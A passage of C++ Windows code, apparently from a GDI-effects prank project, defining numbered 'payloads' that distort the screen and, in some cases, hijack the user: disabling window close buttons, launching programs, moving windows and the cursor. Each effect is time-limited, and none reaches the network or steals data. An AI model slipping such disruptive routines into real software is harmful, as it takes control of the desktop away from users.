                p[i] =
                    ShiftHSL(
                        p[i],
                        pulse / 255.0f,
                        (edgeR + edgeG + edgeB)
                            / 3.0f / 255.0f,
                        (edgeR + edgeG + edgeB)
                            / 6.0f / 255.0f
                    );
            }
        }

        s.Present();

        ++t;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 18
// Liquid ripple
// ============================================================

DWORD WINAPI GDIPayload18(LPVOID)
{
    const SeedVariant& sd = SeedGet(18);

    GDISurface s;

    if (!s.Init())
        return 0;

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        int slice = 4 + sd.amp;

        for (
            int y = 0;
            y < s.h;
            y += slice
            )
        {
            int shift =
                static_cast<int>(
                    std::sin(
                        y * 0.045 +
                        t * 0.12 +
                        sd.phase * 0.0002
                    ) *
                    (45.0 * sd.amp / 4)
                    );

            int rows =
                std::min(
                    slice,
                    s.h - y
                );

            BitBlt(
                s.screen,
                shift,
                y,
                s.w,
                rows,
                s.screen,
                0,
                y,
                SRCCOPY
            );
        }

        ++t;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 19
// Quantum spiral
// ============================================================

DWORD WINAPI GDIPayload19(LPVOID)
{
    const SeedVariant& sd = SeedGet(19);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w =
        GetSystemMetrics(
            SM_CXSCREEN
        );

    const int h =
        GetSystemMetrics(
            SM_CYSCREEN
        );

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        int cx = w / 2;
        int cy = h / 2;

        int wave =
            static_cast<int>(
                std::sin(
                    (t + sd.phase / 8) * 0.04
                ) *
                (100.0 * sd.amp / 4)
                );

        POINT pts[3];

        pts[0] =
        {
            cx - w / 2 + wave,
            cy - h / 2
        };

        pts[1] =
        {
            cx + w / 2,
            cy - h / 2 - wave
        };

        pts[2] =
        {
            cx - w / 2 - wave,
            cy + h / 2
        };

        PlgBlt(
            dc,
            pts,
            dc,
            0,
            0,
            w,
            h,
            nullptr,
            0,
            0
        );

        if ((t % 30) == 0)
        {
            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                NOTSRCCOPY
            );
        }

        ++t;

        FPS16(nextFrame);
    }

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 20
// Color worm
// ============================================================

DWORD WINAPI GDIPayload20(LPVOID)
{
    const SeedVariant& sd = SeedGet(20);

    GDISurface s;

    if (!s.Init())
        return 0;

    static int sine[2048];
    static bool initialized = false;

    if (!initialized)
    {
        for (int i = 0; i < 2048; ++i)
        {
            sine[i] =
                static_cast<int>(
                    std::sin(
                        i *
                        6.28318530718 /
                        2048.0
                    ) *
                    127.0
                    ) +
                128;
        }

        initialized = true;
    }

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        uint32_t* p =
            s.pixels;

        for (int y = 0; y < s.h; ++y)
        {
            int rowWave =
                sine[
                    (y * 3 + t * 4 + sd.phase / 2)
                        & 2047
                ];

            for (int x = 0; x < s.w; ++x)
            {
                int i =
                    y * s.w + x;

                int wave =
                    sine[
                        (
                            x * 2 +
                            rowWave +
                            t * 7 +
                            sd.phase
                            ) & 2047
                    ];

                p[i] =
                    ShiftHSL(
                        p[i],
                        wave / 255.0f * sd.dir,
                        0.0f,
                        (sine[(wave + t * 5) & 2047] - 128)
                            / 255.0f / 4.0f
                    );
            }
        }

        s.Present();

        t += 3;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 21
// Radial shockwave
// ============================================================

DWORD WINAPI GDIPayload21(LPVOID)
{
    const SeedVariant& sd = SeedGet(21);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w =
        GetSystemMetrics(
            SM_CXSCREEN
        );

    const int h =
        GetSystemMetrics(
            SM_CYSCREEN
        );

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        double phase =
            (t + sd.phase / 8) * 0.06;

        int radius =
            static_cast<int>(
                (
                    std::sin(phase) +
                    1.0
                    ) *
                0.5 *
                (w / 2) *
                (sd.amp / 4.0)
                );

        int distortion =
            static_cast<int>(
                std::sin(
                    phase * 2.0
                ) *
                (55.0 + sd.amp * 4)
                );

        int left =
            std::max(
                0,
                radius / 4 +
                distortion
            );

        int top =
            std::max(
                0,
                radius / 6
            );

        int rw =
            std::max(
                1,
                w - left * 2
            );

        int rh =
            std::max(
                1,
                h - top * 2
            );

        StretchBlt(
            dc,
            left,
            top,
            rw,
            rh,
            dc,
            0,
            0,
            w,
            h,
            SRCCOPY
        );

        if ((t % 40) < 3)
        {
            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                DSTINVERT
            );
        }

        ++t;

        FPS16(nextFrame);
    }

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 22
// RGB void
// ============================================================

DWORD WINAPI GDIPayload22(LPVOID)
{
    const SeedVariant& sd = SeedGet(22);

    GDISurface s;

    if (!s.Init())
        return 0;

    static int sine[2048];
    static bool initialized = false;

    if (!initialized)
    {
        for (int i = 0; i < 2048; ++i)
        {
            sine[i] =
                static_cast<int>(
                    std::sin(
                        i *
                        6.28318530718 /
                        2048.0
                    ) *
                    127.0
                    );
        }

        initialized = true;
    }

    const int cx =
        s.w / 2;

    const int cy =
        s.h / 2;

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        uint32_t* p =
            s.pixels;

        for (int y = 0; y < s.h; ++y)
        {
            int dy =
                y - cy;

            for (int x = 0; x < s.w; ++x)
            {
                int dx =
                    x - cx;

                int i =
                    y * s.w + x;

                uint32_t dist2 =
                    static_cast<uint32_t>(
                        dx * dx +
                        dy * dy
                        );

                int wave =
                    sine[
                        (
                            (dist2 >> 10) +
                            t * 8 +
                            sd.phase
                            ) & 2047
                    ];

                p[i] =
                    ShiftHSL(
                        p[i],
                        wave / 255.0f / 2.0f * sd.dir,
                        0.0f,
                        wave / 255.0f / 4.0f
                    );
            }
        }

        s.Present();

        ++t;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 23
// Retro CRT
// ============================================================

DWORD WINAPI GDIPayload23(LPVOID)
{
    const SeedVariant& sd = SeedGet(23);

    GDISurface s;

    if (!s.Init())
        return 0;

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        uint32_t* p =
            s.pixels;

        for (int y = 0; y < s.h; ++y)
        {
            int scanline =
                (y + t) & 3;

            for (int x = 0; x < s.w; ++x)
            {
                int i =
                    y * s.w + x;

                int aberration =
                    static_cast<int>(
                        std::sin(
                            x * 0.015 +
                            t * 0.08 +
                            sd.phase * 0.0002
                        ) *
                        (16.0 + sd.amp)
                        );

                p[i] =
                    ShiftHSL(
                        p[i],
                        aberration / 255.0f * sd.dir,
                        0.0f,
                        scanline == 0 ? -0.20f : 0.0f
                    );
            }
        }

        s.Present();

        ++t;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 24
// Absolute GDI chaos
// ============================================================

DWORD WINAPI GDIPayload24(LPVOID)
{
    const SeedVariant& sd = SeedGet(24);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w =
        GetSystemMetrics(
            SM_CXSCREEN
        );

    const int h =
        GetSystemMetrics(
            SM_CYSCREEN
        );

    uint32_t rng =
        sd.rng;

    int frame = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        int mode =
            FXRand(rng) & 7;

        switch (mode)
        {
        case 0:

            BitBlt(
                dc,
                0,
                0,
                w,
                h,
                dc,
                6,
                0,
                SRCCOPY
            );

            break;

        case 1:

            BitBlt(
                dc,
                0,
                0,
                w,
                h,
                dc,
                -6,
                0,
                NOTSRCCOPY
            );

            break;

        case 2:

            BitBlt(
                dc,
                0,
                4,
                w,
                h,
                dc,
                0,
                0,
                SRCPAINT
            );

            break;

        case 3:

            BitBlt(
                dc,
                0,
                0,
                w,
                h,
                dc,
                0,
                4,
                SRCAND
            );

            break;

        case 4:
        {
            int inset =
                10 +
                static_cast<int>(
                    FXRand(rng) % 80
                    );

            StretchBlt(
                dc,
                inset,
                inset,
                std::max(
                    1,
                    w - inset * 2
                ),
                std::max(
                    1,
                    h - inset * 2
                ),
                dc,
                0,
                0,
                w,
                h,
                SRCCOPY
            );

            break;
        }

        case 5:
        {
            int y =
                FXRand(rng) % h;

            int height =
                4 +
                FXRand(rng) % (40 + sd.amp * 5);

            int offset =
                static_cast<int>(
                    FXRand(rng) % (200 + sd.amp * 15)
                    ) -
                (100 + sd.amp * 8);

            BitBlt(
                dc,
                offset,
                y,
                w,
                height,
                dc,
                0,
                y,
                SRCCOPY
            );

            break;
        }

        case 6:

            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                DSTINVERT
            );

            break;

        case 7:
        {
            POINT pts[3];

            int wobble =
                static_cast<int>(
                    std::sin(
                        (frame + sd.phase / 6) * 0.05
                    ) *
                    (100.0 * sd.amp / 4)
                    );

            pts[0] =
            {
                -wobble,
                0
            };

            pts[1] =
            {
                w + wobble,
                20
            };

            pts[2] =
            {
                30,
                h
            };

            PlgBlt(
                dc,
                pts,
                dc,
                0,
                0,
                w,
                h,
                nullptr,
                0,
                0
            );

            break;
        }
        }

        ++frame;

        FPS16(nextFrame);
    }

    ReleaseDC(
        nullptr,
        dc
    );

    return 0;
}

// ============================================================
// PAYLOADS 25-49
// Ported from a public GDI-effects dump, adapted to HPPD's
// LPTHREAD_START_ROUTINE shape and the global SEED system.
// All `while(true)` loops are bounded by FXTimeout so they
// end on their own (or on ESC) after ~5s.
// ============================================================

// 25 - Dark (vertical band darken via SRCAND)
DWORD WINAPI GDIPayload25(LPVOID)
{
    const SeedVariant& sd = SeedGet(25);
    srand(SeedRand(25));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        for (int ys = 0; ys < y; ys += 6)
        {
            if (FXAbort())
                break;

            StretchBlt(
                hdc, 0, 0, x, ys,
                hdc, 0, 0, 1, 1,
                SRCAND
            );

            //Sleep(1);
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 26 - Cursors (DrawIcon trails of the cursor icon)
DWORD WINAPI GDIPayload26(LPVOID)
{
    const SeedVariant& sd = SeedGet(26);
    srand(SeedRand(26));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    CURSORINFO cur{};

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = 0;
        int ys = 0;
        int sel = rand() % 4 + 1;

        if (sel == 1)
        {
            xs = rand() % x;

            for (; ys < y; ys += 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs += 2;

                if (xs >= x)
                    ys = y;

                //Sleep(1);
            }
        }
        else if (sel == 2)
        {
            xs = rand() % x;
            ys = y;

            for (; ys > 0; ys -= 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs += 2;

                if (xs >= x)
                    ys = 0;

                //Sleep(1);
            }
        }
        else if (sel == 3)
        {
            xs = rand() % x;

            for (; ys < y; ys += 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs -= 2;

                if (xs <= 0)
                    ys = y;

                //Sleep(1);
            }
        }
        else
        {
            xs = rand() % x;
            ys = y;

            for (; ys > 0; ys -= 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs -= 2;

                if (xs <= 0)
                    ys = 0;

                //Sleep(1);
            }
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 27 - Programs (ShellExecute loop of notepad / calc / mspaint)
DWORD WINAPI GDIPayload27(LPVOID)
{
    const SeedVariant& sd = SeedGet(27);
    srand(SeedRand(27));

    const wchar_t* programs[] = {
        L"notepad.exe",
        L"calc.exe",
        L"mspaint.exe"
    };

    constexpr int count = sizeof(programs) / sizeof(programs[0]);

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        const wchar_t* program = programs[rand() % count];

        ShellExecuteW(
            nullptr,
            L"open",
            program,
            nullptr,
            nullptr,
            SW_SHOW
        );

        Sleep(2500);
    }

    return 0;
}

// 28 - Buttons (disable Close / Min / Max on foreground window)
DWORD WINAPI GDIPayload28(LPVOID)
{
    const SeedVariant& sd = SeedGet(28);
    srand(SeedRand(28));

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (hwnd)
        {
            HMENU menu = GetSystemMenu(hwnd, FALSE);

            if (menu)
            {
                EnableMenuItem(
                    menu,
                    SC_CLOSE,
                    MF_BYCOMMAND | MF_DISABLED | MF_GRAYED
                );
            }

            LONG_PTR style = GetWindowLongPtrW(hwnd, GWL_STYLE);

            style &= ~static_cast<LONG_PTR>(
                WS_MINIMIZEBOX | WS_MAXIMIZEBOX
            );

            SetWindowLongPtrW(hwnd, GWL_STYLE, style);
        }

        //Sleep(10);
    }

    return 0;
}

// 29 - RGBCircle (random-coloured ellipse marching across the screen)
DWORD WINAPI GDIPayload29(LPVOID)
{
    const SeedVariant& sd = SeedGet(29);
    srand(SeedRand(29));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    int xs = rand() % x;
    int ys = rand() % y;

    int color = 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        COLORREF colors[] = {
            RGB(255, 0, 0),
            RGB(255, 165, 0),
            RGB(255, 255, 0),
            RGB(0, 255, 0),
            RGB(0, 255, 255),
            RGB(0, 0, 255),
            RGB(148, 0, 211),
            RGB(255, 0, 255)
        };

        HBRUSH circle = CreateSolidBrush(colors[color % 8]);
        HPEN border = CreatePen(PS_SOLID, 1, RGB(255, 255, 255));

        if (!circle || !border)
        {
            if (circle) DeleteObject(circle);
            if (border) DeleteObject(border);
            break;
        }

        HGDIOBJ oldBrush = SelectObject(hdc, circle);
        HGDIOBJ oldPen = SelectObject(hdc, border);

        int sel = rand() % 4 + 1;

        for (int runtime = 0; runtime < 10; runtime++)
        {
            if (FXAbort())
                break;

            if (sel == 1)
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs += 20;
                ys += 20;
            }
            else if (sel == 2)
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs += 20;
                ys -= 20;
            }
            else if (sel == 3)
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs -= 20;
                ys += 20;
            }
            else
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs -= 20;
                ys -= 20;
            }

            Sleep(130);
        }

        SelectObject(hdc, oldBrush);
        SelectObject(hdc, oldPen);

        DeleteObject(circle);
        DeleteObject(border);

        if (xs >= x || xs <= 0 || ys >= y || ys <= 0)
        {
            xs = rand() % x;
            ys = rand() % y;
        }

        color++;
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 30 - IconWave (sine wave of system icons across / down the screen)
DWORD WINAPI GDIPayload30(LPVOID)
{
    const SeedVariant& sd = SeedGet(30);
    srand(SeedRand(30));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        if (FXAbort())
            break;

        int sel = rand() % 4 + 1;

        double wave = 0;
        double i = 0;

        int xs;
        int ys;

        if (sel == 1)
        {
            xs = 0;
            ys = rand() % y;

            for (; xs < x; xs += 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs,
                    ys + static_cast<int>(wave * cos(i)),
                    LoadIconW(0, IDI_ERROR)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
        else if (sel == 2)
        {
            xs = x;
            ys = rand() % y;

            for (; xs > 0; xs -= 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs,
                    ys + static_cast<int>(wave * cos(i)),
                    LoadIconW(0, IDI_WARNING)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
        else if (sel == 3)
        {
            xs = rand() % x;
            ys = 0;

            for (; ys < y; ys += 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs + static_cast<int>(wave * cos(i)),
                    ys,
                    LoadIconW(0, IDI_INFORMATION)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
        else
        {
            xs = rand() % x;
            ys = y;

            for (; ys > 0; ys -= 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs + static_cast<int>(wave * cos(i)),
                    ys,
                    LoadIconW(0, IDI_QUESTION)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 31 - Sinewave (per-row BitBlt with sin-shifted x)
DWORD WINAPI GDIPayload31(LPVOID)
{
    const SeedVariant& sd = SeedGet(31);
    srand(SeedRand(31));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    double i = 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        for (int ys = 0; ys < y; ys++)
        {
            if (FXAbort())
                break;

            BitBlt(
                hdc,
                static_cast<int>(8 * sin(i)),
                ys,
                x,
                1,
                hdc,
                0,
                ys,
                SRCCOPY
            );

            i += 0.04;
        }

        //Sleep(40);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 32 - Shake (4-direction screen shake)
DWORD WINAPI GDIPayload32(LPVOID)
{
    const SeedVariant& sd = SeedGet(32);
    srand(SeedRand(32));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        BitBlt(hdc, 10, 10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);

        BitBlt(hdc, -10, 10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);

        BitBlt(hdc, 10, -10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);

        BitBlt(hdc, -10, -10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 33 - Dark2 (random 1-px BitBlt SRCAND)
DWORD WINAPI GDIPayload33(LPVOID)
{
    const SeedVariant& sd = SeedGet(33);
    srand(SeedRand(33));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        BitBlt(
            hdc,
            rand() % 2,
            rand() % 2,
            x,
            y,
            hdc,
            rand() % 2,
            rand() % 2,
            SRCAND
        );

        Sleep(130);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 34 - Melter (quadrant BitBlt of a random patch)
DWORD WINAPI GDIPayload34(LPVOID)
{
    const SeedVariant& sd = SeedGet(34);
    srand(SeedRand(34));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = rand() % x;
        int ys = rand() % y;
        int sel = rand() % 4 + 1;
        int size = rand() % 300 + 200;
        int rnd = rand() % 50 + 20;

        for (int i = 0; i < rnd; i += 10)
        {
            if (FXAbort())
                break;

            int dx = xs;
            int dy = ys;

            if (sel == 1)      { dx += i; dy += i; }
            else if (sel == 2) { dx += i; dy -= i; }
            else if (sel == 3) { dx -= i; dy += i; }
            else               { dx -= i; dy -= i; }

            BitBlt(
                hdc,
                dx, dy,
                size, size,
                hdc,
                xs, ys,
                SRCCOPY
            );

            Sleep(100);
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 35 - Trails (DrawIcon under the actual cursor pos)
DWORD WINAPI GDIPayload35(LPVOID)
{
    const SeedVariant& sd = SeedGet(35);
    srand(SeedRand(35));

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    POINT curpos{};
    CURSORINFO cur{};

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        if (FXAbort())
            break;

        GetCursorPos(&curpos);

        cur.cbSize = sizeof(cur);
        GetCursorInfo(&cur);

        DrawIcon(hdc, curpos.x, curpos.y, cur.hCursor);

        //Sleep(10);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 36 - ResizeWindow (move + resize foreground window randomly)
DWORD WINAPI GDIPayload36(LPVOID)
{
    const SeedVariant& sd = SeedGet(36);
    srand(SeedRand(36));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (hwnd)
        {
            SetWindowPos(
                hwnd,
                nullptr,
                rand() % x,
                rand() % y,
                rand() % x + 100,
                rand() % y + 100,
                0
            );
        }

        Sleep(rand() % 800 + 600);
    }

    return 0;
}

// 37 - MoveWindowFunc (quadrant drag of foreground window)
DWORD WINAPI GDIPayload37(LPVOID)
{
    const SeedVariant& sd = SeedGet(37);
    srand(SeedRand(37));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    RECT rekt{};

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (!hwnd)
            continue;

        GetWindowRect(hwnd, &rekt);

        int xs = rekt.left;
        int ys = rekt.top;

        int sel = rand() % 4 + 1;
        int rnd = rand() % 100 + 60;

        for (int i = 0; i < rnd; i += 20)
        {
            if (FXAbort())
                break;

            int nx = xs;
            int ny = ys;

            if (sel == 1)      { nx += i; ny += i; }
            else if (sel == 2) { nx -= i; ny += i; }
            else if (sel == 3) { nx += i; ny -= i; }
            else               { nx -= i; ny -= i; }

            SetWindowPos(
                hwnd,
                nullptr,
                nx,
                ny,
                rekt.right - rekt.left,
                rekt.bottom - rekt.top,
                0
            );

            //Sleep(10);
        }

        if (xs > x || ys > y)
            SetWindowPos(
                hwnd, nullptr, 0, 0, 0, 0,
                SWP_NOSIZE | SWP_NOZORDER
            );
    }

    return 0;
}

// 38 - Melter2 (random 1-2 px BitBlt SRCCOPY)
DWORD WINAPI GDIPayload38(LPVOID)
{
    const SeedVariant& sd = SeedGet(38);
    srand(SeedRand(38));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        BitBlt(
            hdc,
            rand() % 2,
            rand() % 2,
            rand() % x,
            rand() % y,
            hdc,
            rand() % 2,
            rand() % 2,
            SRCCOPY
        );
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 39 - WindowMax (maximise foreground every 1.3s)
DWORD WINAPI GDIPayload39(LPVOID)
{
    const SeedVariant& sd = SeedGet(39);
    srand(SeedRand(39));

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (hwnd)
            ShowWindow(hwnd, SW_MAXIMIZE);

        Sleep(1300);
    }

    return 0;
}

// 40 - Rotate (PlgBlt wobble, two opposing sweeps)
DWORD WINAPI GDIPayload40(LPVOID)
{
    const SeedVariant& sd = SeedGet(40);
    srand(SeedRand(40));

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    RECT rekt{};
    POINT rotate[3];

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int rnd = rand() % 65 + 60;

        for (int i = 0; i < rnd; i += 20)
        {
            if (FXAbort())
                break;

            GetWindowRect(GetDesktopWindow(), &rekt);

            rotate[0].x = rekt.left + i;
            rotate[0].y = rekt.top - i;
            rotate[1].x = rekt.right + i;
            rotate[1].y = rekt.top + i;
            rotate[2].x = rekt.left - i;
            rotate[2].y = rekt.bottom - i;

            PlgBlt(
                hdc, rotate, hdc, 0, 0,
                rekt.right - rekt.left,
                rekt.bottom - rekt.top,
                0, 0, 0
            );

            //Sleep(40);
        }

        for (int i = 0; i < rnd; i += 20)
        {
            if (FXAbort())
                break;

            GetWindowRect(GetDesktopWindow(), &rekt);

            rotate[0].x = rekt.left - i;
            rotate[0].y = rekt.top + i;
            rotate[1].x = rekt.right - i;
            rotate[1].y = rekt.top - i;
            rotate[2].x = rekt.left + i;
            rotate[2].y = rekt.bottom + i;

            PlgBlt(
                hdc, rotate, hdc, 0, 0,
                rekt.right - rekt.left,
                rekt.bottom - rekt.top,
                0, 0, 0
            );

            //Sleep(40);
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 41 - Rainbow (random brush + PATINVERT)
DWORD WINAPI GDIPayload41(LPVOID)
{
    const SeedVariant& sd = SeedGet(41);
    srand(SeedRand(41));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HBRUSH brush = CreateSolidBrush(
            RGB(
                rand() % 255,
                rand() % 255,
                rand() % 255
            )
        );

        if (brush)
        {
            HGDIOBJ oldBrush = SelectObject(hdc, brush);

            PatBlt(hdc, 0, 0, x, y, PATINVERT);

            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
        }

        Sleep(rand() % 200 + 130);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 42 - RandomCur (SetCursorPos loop)
DWORD WINAPI GDIPayload42(LPVOID)
{
    const SeedVariant& sd = SeedGet(42);
    srand(SeedRand(42));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        SetCursorPos(rand() % x, rand() % y);

        Sleep(rand() % 800 + 300);
    }

    return 0;
}

// 43 - Melter3 (horizontal bar shift)
DWORD WINAPI GDIPayload43(LPVOID)
{
    const SeedVariant& sd = SeedGet(43);
    srand(SeedRand(43));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int ys = rand() % y;
        int size = rand() % 80 + 50;

        if (rand() % 2 == 0)
        {
            for (int i = 0; i < 5; i++)
            {
                if (FXAbort())
                    break;

                BitBlt(
                    hdc,
                    i, ys,
                    x, size,
                    hdc,
                    0, ys,
                    SRCCOPY
                );
            }
        }
        else
        {
            for (int i = 0; i < 5; i++)
            {
                if (FXAbort())
                    break;

                BitBlt(
                    hdc,
                    -i, ys,
                    x, size,
                    hdc,
                    0, ys,
                    SRCCOPY
                );
            }
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 44 - Colors (4-direction 1px BitBlt with random ternary ROP)
DWORD WINAPI GDIPayload44(LPVOID)
{
    const SeedVariant& sd = SeedGet(44);
    srand(SeedRand(44));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        DWORD rop = (rand() % 2) ? 0x666666 : 0x999999;

        BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);

        BitBlt(hdc, -1, 1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);

        BitBlt(hdc, 1, -1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);

        BitBlt(hdc, -1, -1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);
    }

    ReleaseDC(0, hdc);
    return 0;
}

